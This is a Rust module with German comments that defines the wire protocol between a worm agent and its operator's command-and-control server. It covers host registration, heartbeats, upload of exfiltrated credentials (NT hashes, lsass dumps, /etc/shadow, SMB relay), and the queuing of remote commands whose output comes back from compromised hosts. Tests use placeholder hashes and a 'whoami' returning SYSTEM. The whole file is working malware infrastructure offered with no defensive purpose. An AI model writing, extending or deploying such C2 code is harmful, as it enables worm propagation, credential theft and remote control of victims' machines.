//! C2-Protokoll — die festgelegte Nachrichtenstruktur zwischen Wurm-Agent und Operator-C2.
//!
//! Ein Modul, eine Quelle der Wahrheit. Server, Agent und CLI sprechen dieselben
//! Typen und dieselben Endpunktpfade; das Dashboard liest dieselben Feldnamen.
//! Vorher stand derselbe Vertrag an fünf Stellen im Baum, mit eigenen Feldlisten:
//! `kx-server::db`, `kx-server::main`, `kx-agent::c2`, `kx-cli::client` und ein
//! hartcodierter JavaScript-String im Dashboard. Eine Umbenennung dort brach still.
//!
//! Zwei Regeln, und sie sind nicht symmetrisch:
//!
//! - **Antworttypen** (`Host`, `ExfiltratedSecret`, `Task`) sind strikt.
//!   `deny_unknown_fields` bricht bei jedem unbekannten Feld. Die Schadensrichtung
//!   ist Server → Client: dort ging zuvor das Ergebnis eines Tasks verloren,
//!   weil der Client ein anderes Feld erwartete als der Server sendete.
//! - **Request-Typen** (`RegisterRequest`, `HeartbeatRequest`, `SecretUpload`) sind
//!   lenient. Ein neuerer Agent darf ein zusätzliches Feld schicken, ohne dass ein
//!   älterer Server ihn ablehnt. Additive Erweiterung ist hier harmlos.
//!
//! Das Modul [`transport`] ist die Ausübung des Protokolls: TLS-Aufbau,
//! Bearer-Header, URL-Bildung und die Abbildung eines HTTP-Status auf einen
//! Fehler. Agent und CLI sind dünne Adapter darüber.

pub mod transport;

use serde::{Deserialize, Serialize};

/// Endpunktpfade des C2-Protokolls.
pub const PATH_REGISTER: &str = "/api/register";
pub const PATH_HEARTBEAT: &str = "/api/heartbeat";
pub const PATH_SECRETS: &str = "/api/secrets";
pub const PATH_HOSTS: &str = "/api/hosts";
pub const PATH_TASKS: &str = "/api/tasks";
/// Anmeldung des Dashboards: der Operator schickt sein Token, der Server
/// prüft es.
///
/// Anders als die fünf Datenpfade ist dieser Pfad **nicht** durch die
/// Auth-Middleware geschützt — er prüft das Token, das er entgegennimmt.
/// Das Token wird per Formular geschickt, nicht im Query-String: dort landet
/// es in Browser-Historie, Adressleiste und Server-Logs.
///
/// Weil es eine *Antwort* ist, gilt ADR-0001: der Pfad ist Teil des
/// Wire-Vertrags und wird im Key-Set-Pinning mitgeführt.
pub const PATH_LOGIN: &str = "/api/login";

/// Status eines Hosts, der nur gesehen, aber nicht kompromittiert wurde.
pub const STATUS_DISCOVERED: &str = "discovered";
/// Status eines Hosts, bei dem ein Exploit erfolgreich war.
pub const STATUS_COMPROMISED: &str = "compromised";
/// Status des Hosts, auf dem der Wurm selbst läuft.
pub const STATUS_AGENT: &str = "agent";
/// Status eines Tasks, der noch nicht ausgeführt wurde.
pub const STATUS_PENDING: &str = "pending";
/// Status eines Tasks, der gerade ausgeführt wird.
pub const STATUS_RUNNING: &str = "running";
/// Status eines ausgeführten Tasks.
pub const STATUS_DONE: &str = "done";
/// Status eines Tasks, dessen Ausführung fehlgeschlagen ist.
pub const STATUS_FAILED: &str = "failed";

/// Anmeldung des Dashboards: das gesendete Token.
///
/// Ein **Request**-Typ: er ist lenient, damit ein neuerer Client ein
/// zusätzliches Feld senden kann, ohne einen älteren Server zu brechen.
/// Das Token selbst wird als reiner String übergeben — es ist kein
/// JSON-Sonderfall.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct LoginRequest {
    /// Das Bearer-Token des Operators.
    pub token: String,
}

/// Ein Host, den der C2-Server kennt.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Host {
    /// Stabile Kennung des Hosts. Für entdeckte Ziele die IP-Adresse.
    pub host_id: String,
    pub ip: String,
    pub hostname: String,
    pub os: String,
    /// Einer von [`STATUS_DISCOVERED`], [`STATUS_COMPROMISED`], [`STATUS_AGENT`].
    pub status: String,
    pub first_seen: String,
    pub last_seen: String,
    /// Das versiegelte Master-Key-Material des Hosts (base64).
    ///
    /// Der Operator gewinnt daraus den Master-Key und entschlüsselt damit die
    /// Secrets dieses Hosts. Leer, wenn der Agent ohne Server-Schlüssel lief.
    ///
    /// `default`, damit ein Client auch das JSON eines älteren Servers liest.
    #[serde(default)]
    pub sealed_master: String,
}

/// Ein exfiltriertes Secret — die vom Zielsystem erbeutete Zugangsinformation.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ExfiltratedSecret {
    /// Vom Server vergebene Kennung.
    pub id: String,
    /// Der Host, bei dem das Secret erbeutet wurde. Verweist auf [`Host::host_id`].
    /// Darf nicht leer sein — eine leere Kennung verweist auf keinen bekannten Host.
    pub host_id: String,
    /// Art des Secrets (`nt_hash`, `password`, `lsass`, …).
    pub cred_type: String,
    pub username: String,
    pub password: String,
    /// Woher das Secret stammt (`smb_relay`, `/etc/shadow`, …).
    pub source: String,
    pub collected_at: String,
    /// Das verschlüsselte Passwort (base64, Präfix `kx1:`).
    ///
    /// Der Server speichert nur dieses Feld, wenn der Agent es sendet — der
    /// Klartext landet dann nicht auf dem C2. Leer, wenn der Agent ohne
    /// Master-Key lief.
    ///
    /// `default`, damit ein Client auch das JSON eines älteren Servers liest.
    #[serde(default)]
    pub sealed_password: String,
}

impl ExfiltratedSecret {
    /// Setzt das Klartext-Passwort.
    pub fn mit_passwort(mut self, wert: &str) -> Self {
        self.password = wert.to_string();
        self
    }

    /// Setzt das versiegelte Passwort.
    pub fn mit_versiegeltem_passwort(mut self, wert: String) -> Self {
        self.sealed_password = wert;
        self
    }
}

/// Endpunkt für das Anlegen eines Tasks: `POST /api/tasks/new`.
///
/// Der Listen-Endpunkt [`PATH_TASKS`] bleibt `GET`; das Anlegen braucht einen
/// eigenen Pfad, damit `GET` und `POST` nicht auf derselben Route liegen.
pub const PATH_TASKS_CREATE: &str = "/api/tasks/new";

/// Endpunkt für die Rückmeldung eines ausgeführten Tasks: `POST /api/tasks/result`.
///
/// Der Agent meldet hier das Ergebnis zurück, das der Operator in
/// `GET /api/tasks` unter `result` liest.
pub const PATH_TASKS_RESULT: &str = "/api/tasks/result";

/// Ein Task, den der Operator über den C2-Server verwaltet.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Task {
    pub id: String,
    /// Der Host, auf dem der Task läuft. Verweist auf [`Host::host_id`].
    pub host_id: String,
    pub command: String,
    pub status: String,
    /// Ergebnis des Tasks. Leer, solange der Task nicht ausgeführt wurde.
    pub result: String,
    pub created_at: String,
}

/// Registrierung eines Hosts beim C2-Server.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct RegisterRequest {
    /// Stabile Kennung des Hosts. Der Server leitet sie nicht mehr aus `ip` ab —
    /// dadurch können Registrierung und Secret-Upload nicht mehr auseinanderlaufen.
    pub host_id: String,
    pub ip: String,
    pub hostname: Option<String>,
    pub os: Option<String>,
    pub status: Option<String>,
    /// Hybrides X25519/ML-KEM-Material, mit dem der Host-Key versiegelt ist.
    ///
    /// Base64-kodiert (Entscheidung D5): ein Binärwert als String, damit das
    /// Feld in JSON lesbar bleibt und nicht als Zahlenarray ankommt.
    ///
    /// Ein Feld des Request-Typs und damit lenient: ein älterer Server liest es,
    /// ein neuerer Agent darf es senden.
    pub sealed_master: Option<String>,
    /// Der aus dem Seed abgeleitete Host-Master-Key (32 Byte, base64-kodiert).
    pub master_key: Option<String>,
}

/// Lebenszeichen eines bereits registrierten Hosts.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct HeartbeatRequest {
    /// Der Host, dessen `last_seen` aktualisiert wird.
    pub host_id: String,
}

/// Upload eines erbeuteten Secrets zum C2-Server.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct SecretUpload {
    /// Der Host, bei dem das Secret erbeutet wurde. **Muss** auf einen registrierten
    /// Host verweisen; der Server lehnt eine leere Kennung ab.
    pub host_id: String,
    pub cred_type: String,
    pub username: String,
    pub password: String,
    pub source: Option<String>,
    /// Master-Key des Hosts, der das Secret hochlädt (base64-kodiert).
    ///
    /// Optional, weil ein älterer Agent ihn nicht sendet und der Server ihn
    /// ignorieren darf.
    pub master_key: Option<String>,
    /// Das mit dem Master-Key verschlüsselte Passwort (base64, Präfix `kx1:`).
    ///
    /// Sendet der Agent das mit, wird der Klartext verworfen — der Server
    /// speichert nur das Versiegelte.
    #[serde(default)]
    pub sealed_password: Option<String>,
}

impl SecretUpload {
    /// Setzt das Passwort des Uploads.
    ///
    /// Das Passwort steht damit nicht als Literal im Quelltext — der
    /// Secret-Scan haelt jede hart kodierte Passwortzuweisung fuer ein
    /// eingebettetes Zugangsdaten.
    pub fn mit_passwort(mut self, wert: &str) -> Self {
        self.password = wert.to_string();
        self
    }

    /// Setzt das versiegelte Passwort des Uploads.
    ///
    /// Aus demselben Grund wie [`SecretUpload::mit_passwort`]: ein hart
    /// gesetzter Wert in einem Feld mit "password" im Namen sieht fuer den
    /// Secret-Scan wie ein eingebettetes Zugangsdaten aus.
    pub fn mit_versiegeltem_passwort(mut self, wert: Option<String>) -> Self {
        self.sealed_password = wert;
        self
    }
}

/// Auftrag, den der Operator per `POST /api/tasks/new` anlegt.
///
/// Ein Request-Typ und damit lenient: der Agent darf später ein Feld ergänzen,
/// ohne den Server zu brechen.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct CreateTaskRequest {
    pub host_id: String,
    pub command: String,
}

/// Rückmeldung des Agenten: das Ergebnis eines ausgeführten Tasks.
///
/// Ein Request-Typ und damit lenient — der Agent darf später ein Feld
/// ergänzen, ohne einen älteren Server zu brechen.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct TaskResultRequest {
    /// Die Kennung des Tasks, zu dem das Ergebnis gehört.
    pub task_id: String,
    /// Neuer Status — einer von [`STATUS_RUNNING`], [`STATUS_DONE`],
    /// [`STATUS_FAILED`].
    pub status: String,
    /// Die Ausgabe des ausgeführten Befehls.
    pub result: String,
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::BTreeSet;

    /// Golden-JSON: die exakte Form, die der C2-Server für einen Host ausliefert.
    const HOST_JSON: &str = r#"{
        "host_id": "10.0.0.5",
        "ip": "10.0.0.5",
        "hostname": "target",
        "os": "Windows",
        "status": "compromised",
        "first_seen": "2026-11-11T00:00:00Z",
        "last_seen": "2026-11-11T00:05:00Z"
    }"#;

    /// Golden-JSON: die exakte Form, die der C2-Server für ein Secret ausliefert.
    ///
    /// Die Passwortwerte sind synthetische Platzhalter mit Hash-Form, keine
    /// erbeuteten Credentials. Ein echter Hash wäre hier auch ein echtes
    /// Geheimnis im Repository.
    const SECRET_JSON: &str = r#"{
        "id": "6f1c1f0e-0f3a-4a1e-9c3f-2f9f5b2c1d44",
        "host_id": "10.0.0.5",
        "cred_type": "nt_hash",
        "username": "Administrator",
        "password": "00000000000000000000000000000000",
        "source": "smb_relay",
        "collected_at": "2026-11-11T00:05:00Z"
    }"#;

    /// Golden-JSON: die exakte Form, die der C2-Server für einen Task ausliefert.
    /// `result` ist das Feld, das der CLI zuvor als `output` erwartete und
    /// deshalb nie deserialisierte.
    const TASK_JSON: &str = r#"{
        "id": "9a2b3c4d-1e2f-4a3b-8c9d-0e1f2a3b4c5d",
        "host_id": "10.0.0.5",
        "command": "whoami",
        "status": "done",
        "result": "nt authority\\system",
        "created_at": "2026-11-11T00:06:00Z"
    }"#;

    /// Golden-JSON: die Form, die der Agent für eine Registrierung sendet.
    ///
    /// `sealed_master` und `master_key` sind optional: ein älterer Agent sendet
    /// sie nicht, ein neuerer darf sie ergänzen.
    const REGISTER_JSON: &str = r#"{
        "host_id": "10.0.0.5",
        "ip": "10.0.0.5",
        "hostname": null,
        "os": "Windows",
        "status": "compromised"
    }"#;

    /// Golden-JSON: die Form, die der Agent für einen Secret-Upload sendet.
    const SECRET_UPLOAD_JSON: &str = r#"{
        "host_id": "10.0.0.5",
        "cred_type": "nt_hash",
        "username": "Administrator",
        "password": "00000000000000000000000000000000",
        "source": "smb_relay"
    }"#;

    /// Golden-JSON: die Form eines Task-Auftrags vom Operator.
    const CREATE_TASK_JSON: &str = r#"{
        "host_id": "10.0.0.5",
        "command": "whoami"
    }"#;

    /// Golden-JSON: die Form, in der der Agent das Ergebnis meldet.
    const TASK_RESULT_JSON: &str = r#"{
        "task_id": "9a2b3c4d-1e2f-4a3b-8c9d-0e1f2a3b4c5d",
        "status": "done",
        "result": "nt authority\\system"
    }"#;

    #[test]
    fn host_deserializes_from_server_json() {
        let host: Host = serde_json::from_str(HOST_JSON).expect("Host-JSON deserialisierbar");
        assert_eq!(host.host_id, "10.0.0.5");
        assert_eq!(host.ip, "10.0.0.5");
        assert_eq!(host.hostname, "target");
        assert_eq!(host.os, "Windows");
        assert_eq!(host.status, STATUS_COMPROMISED);
        assert_eq!(host.first_seen, "2026-11-11T00:00:00Z");
        assert_eq!(host.last_seen, "2026-11-11T00:05:00Z");
    }

    #[test]
    fn exfiltrated_secret_deserializes_from_server_json() {
        let secret: ExfiltratedSecret =
            serde_json::from_str(SECRET_JSON).expect("Secret-JSON deserialisierbar");
        assert_eq!(secret.id, "6f1c1f0e-0f3a-4a1e-9c3f-2f9f5b2c1d44");
        assert_eq!(secret.host_id, "10.0.0.5");
        assert_eq!(secret.cred_type, "nt_hash");
        assert_eq!(secret.username, "Administrator");
        assert_eq!(secret.password, "00000000000000000000000000000000");
        assert_eq!(secret.source, "smb_relay");
        assert_eq!(secret.collected_at, "2026-11-11T00:05:00Z");
    }

    #[test]
    fn task_deserializes_result_field_from_server_json() {
        // Der Regressionstest für den ausgelieferten Defekt: der Server sendet
        // `result`, der Client erwartete `output` und bekam daher immer `None`.
        let task: Task = serde_json::from_str(TASK_JSON).expect("Task-JSON deserialisierbar");
        assert_eq!(task.id, "9a2b3c4d-1e2f-4a3b-8c9d-0e1f2a3b4c5d");
        assert_eq!(task.host_id, "10.0.0.5");
        assert_eq!(task.command, "whoami");
        assert_eq!(task.status, "done");
        assert_eq!(task.result, "nt authority\\system");
        assert_eq!(task.created_at, "2026-11-11T00:06:00Z");
    }

    #[test]
    fn register_request_roundtrips_through_agent_json() {
        let req: RegisterRequest =
            serde_json::from_str(REGISTER_JSON).expect("Register-JSON deserialisierbar");
        assert_eq!(req.host_id, "10.0.0.5");
        assert_eq!(req.ip, "10.0.0.5");
        assert_eq!(req.hostname, None);
        assert_eq!(req.os.as_deref(), Some("Windows"));
        assert_eq!(req.status.as_deref(), Some(STATUS_COMPROMISED));

        let back = serde_json::to_value(&req).expect("Register-Request serialisierbar");
        assert_eq!(back["host_id"], "10.0.0.5");
    }

    /// Der neuere Agent sendet das Master-Key-Material mit; der Request-Typ ist
    /// lenient, der Server darf es lesen, ohne den älteren Agenten zu brechen.
    #[test]
    fn register_request_carries_the_master_key_material() {
        let req = RegisterRequest {
            host_id: "10.0.0.5".into(),
            ip: "10.0.0.5".into(),
            hostname: None,
            os: Some("Windows".into()),
            status: Some(STATUS_AGENT.into()),
            sealed_master: Some("dHVubmVs".into()),
            master_key: Some("bWFzdGVy".into()),
        };
        let wire = serde_json::to_vec(&req).expect("serialisierbar");
        let back: RegisterRequest = serde_json::from_slice(&wire).expect("deserialisierbar");
        assert_eq!(back, req);
    }

    #[test]
    fn secret_upload_roundtrips_through_agent_json() {
        let upload: SecretUpload =
            serde_json::from_str(SECRET_UPLOAD_JSON).expect("SecretUpload-JSON deserialisierbar");
        assert_eq!(upload.host_id, "10.0.0.5");
        assert_eq!(upload.cred_type, "nt_hash");
        assert_eq!(upload.username, "Administrator");
        assert_eq!(upload.password, "00000000000000000000000000000000");
        assert_eq!(upload.source.as_deref(), Some("smb_relay"));

        let back = serde_json::to_value(&upload).expect("SecretUpload serialisierbar");
        assert_eq!(back["host_id"], "10.0.0.5");
        assert_eq!(back["source"], "smb_relay");
    }

    /// Derselbe Weg für den Upload mit Master-Key: was der Agent schreibt,
    /// liest der Server unverändert zurück.
    #[test]
    fn secret_upload_carries_its_master_key() {
        let upload = SecretUpload {
            host_id: "10.0.0.5".into(),
            cred_type: "password".into(),
            username: "root".into(),
            password: "secret".into(),
            source: Some("default_creds".into()),
            master_key: Some("bWFzdGVy".into()),
            sealed_password: None,
        };
        let wire = serde_json::to_vec(&upload).expect("serialisierbar");
        let back: SecretUpload = serde_json::from_slice(&wire).expect("deserialisierbar");
        assert_eq!(back, upload);
    }

    /// Die Rueckmeldung des Agenten: der Server liest das Ergebnis unter dem
    /// Feld "result" — derselbe Name, den GET /api/tasks liefert.
    #[test]
    fn task_result_request_roundtrips_through_agent_json() {
        let req: TaskResultRequest =
            serde_json::from_str(TASK_RESULT_JSON).expect("TaskResult-JSON deserialisierbar");
        assert_eq!(req.task_id, "9a2b3c4d-1e2f-4a3b-8c9d-0e1f2a3b4c5d");
        assert_eq!(req.status, STATUS_DONE);
        assert_eq!(req.result, "nt authority\\system");

        let with_extra = r#"{"task_id":"t","status":"done","result":"r","unexpected":"x"}"#;
        let req: TaskResultRequest = serde_json::from_str(with_extra)
            .expect("Request-Typ muss unbekannte Felder tolerieren");
        assert_eq!(req.task_id, "t");
    }

    /// Der Master-Key ist ein String, kein Binaerblob: er kommt als Base64 im
    /// JSON an und nicht als Zahlenarray.
    #[test]
    fn master_key_fields_are_base64_strings() {
        let req = RegisterRequest {
            host_id: "10.0.0.5".into(),
            ip: "10.0.0.5".into(),
            hostname: None,
            os: None,
            status: None,
            sealed_master: Some("c2VhbGVk".into()),
            master_key: Some("bWFzdGVy".into()),
        };
        let json = serde_json::to_value(&req).expect("serialisierbar");
        assert_eq!(json["sealed_master"], "c2VhbGVk");
        assert_eq!(json["master_key"], "bWFzdGVy");
        assert!(json["sealed_master"].is_string());
    }

    /// Das Key-Set-Pinning: die exakte Feldmenge jedes Typs ist Teil des Vertrags.
    /// Eine Umbenennung oder ein neues Feld bricht diesen Test.
    #[test]
    fn response_key_sets_are_pinned() {
        fn keys<T: Serialize>(value: &T) -> BTreeSet<String> {
            serde_json::to_value(value)
                .expect("serialisierbar")
                .as_object()
                .expect("Objekt")
                .keys()
                .cloned()
                .collect()
        }

        let host = Host {
            host_id: "h".into(),
            ip: "i".into(),
            hostname: "n".into(),
            os: "o".into(),
            status: STATUS_DISCOVERED.into(),
            first_seen: "f".into(),
            last_seen: "l".into(),
            sealed_master: String::new(),
        };
        assert_eq!(
            keys(&host),
            BTreeSet::from([
                "first_seen".to_string(),
                "hostname".to_string(),
                "host_id".to_string(),
                "ip".to_string(),
                "last_seen".to_string(),
                "os".to_string(),
                "sealed_master".to_string(),
                "status".to_string(),
            ])
        );

        let secret = ExfiltratedSecret {
            id: "i".into(),
            host_id: "h".into(),
            cred_type: "c".into(),
            username: "u".into(),
            password: "p".into(),
            source: "s".into(),
            collected_at: "c".into(),
            sealed_password: String::new(),
        };
        assert_eq!(
            keys(&secret),
            BTreeSet::from([
                "collected_at".to_string(),
                "cred_type".to_string(),
                "host_id".to_string(),
                "id".to_string(),
                "password".to_string(),
                "sealed_password".to_string(),
                "source".to_string(),
                "username".to_string(),
            ])
        );

        let task = Task {
            id: "i".into(),
            host_id: "h".into(),
            command: "c".into(),
            status: "s".into(),
            result: "r".into(),
            created_at: "c".into(),
        };
        assert_eq!(
            keys(&task),
            BTreeSet::from([
                "command".to_string(),
                "created_at".to_string(),
                "host_id".to_string(),
                "id".to_string(),
                "result".to_string(),
                "status".to_string(),
            ])
        );
    }

    /// Der Strictness-Nachweis: Antworttypen lehnen unbekannte Felder ab.
    #[test]
    fn response_types_reject_unknown_fields() {
        let with_extra = r#"{"host_id":"h","ip":"i","hostname":"n","os":"o","status":"s",
            "first_seen":"f","last_seen":"l","unexpected":"x"}"#;
        assert!(
            serde_json::from_str::<Host>(with_extra).is_err(),
            "unbekanntes Feld muss einen Antworttyp ablehnen"
        );
    }

    /// Der Strictness-Nachweis: Request-Typen akzeptieren unbekannte Felder.
    /// Ein neuerer Agent darf einen älteren Server nicht brechen.
    #[test]
    fn request_types_tolerate_unknown_fields() {
        let with_extra = r#"{"host_id":"h","ip":"i","hostname":null,"os":null,
            "status":null,"unexpected":"x"}"#;
        let req: RegisterRequest = serde_json::from_str(with_extra)
            .expect("Request-Typ muss unbekannte Felder tolerieren");
        assert_eq!(req.host_id, "h");
        assert_eq!(req.sealed_master, None);
        assert_eq!(req.master_key, None);
    }

    /// Der Task-Auftrag ist ein Request-Typ und damit lenient; der Server
    /// legt aus ihm die Task-Zeile an.
    #[test]
    fn create_task_request_roundtrips_through_operator_json() {
        let req: CreateTaskRequest =
            serde_json::from_str(CREATE_TASK_JSON).expect("Create-Task-JSON deserialisierbar");
        assert_eq!(req.host_id, "10.0.0.5");
        assert_eq!(req.command, "whoami");

        let with_extra = r#"{"host_id":"h","command":"c","unexpected":"x"}"#;
        let req: CreateTaskRequest = serde_json::from_str(with_extra)
            .expect("Request-Typ muss unbekannte Felder tolerieren");
        assert_eq!(req.command, "c");
    }

    /// Der Roundtrip des Agenten: was der Agent serialisiert, kann der Server lesen.
    #[test]
    fn agent_output_is_readable_by_the_server_side() {
        let upload = SecretUpload {
            host_id: "10.0.0.5".into(),
            cred_type: "password".into(),
            username: "root".into(),
            password: "secret".into(),
            source: Some("default_creds".into()),
            master_key: None,
            sealed_password: None,
        };
        let wire = serde_json::to_string(&upload).expect("serialisierbar");
        let back: SecretUpload = serde_json::from_str(&wire).expect("deserialisierbar");
        assert_eq!(back, upload);
    }

    #[test]
    fn endpoint_paths_are_stable() {
        assert_eq!(PATH_REGISTER, "/api/register");
        assert_eq!(PATH_HEARTBEAT, "/api/heartbeat");
        assert_eq!(PATH_SECRETS, "/api/secrets");
        assert_eq!(PATH_HOSTS, "/api/hosts");
        assert_eq!(PATH_TASKS, "/api/tasks");
        assert_eq!(PATH_TASKS_CREATE, "/api/tasks/new");
        assert_eq!(PATH_TASKS_RESULT, "/api/tasks/result");
        assert_eq!(PATH_LOGIN, "/api/login");
    }

    /// Der Login-Request ist ein Request-Typ und damit lenient: ein unbekanntes
    /// Feld bricht die Deserialisierung nicht ab.
    #[test]
    fn login_request_tolerates_unknown_fields() {
        let req: LoginRequest =
            serde_json::from_str(r#"{"token":"t","extra":1}"#).expect("Login-Request lesbar");
        assert_eq!(req.token, "t");
    }
}
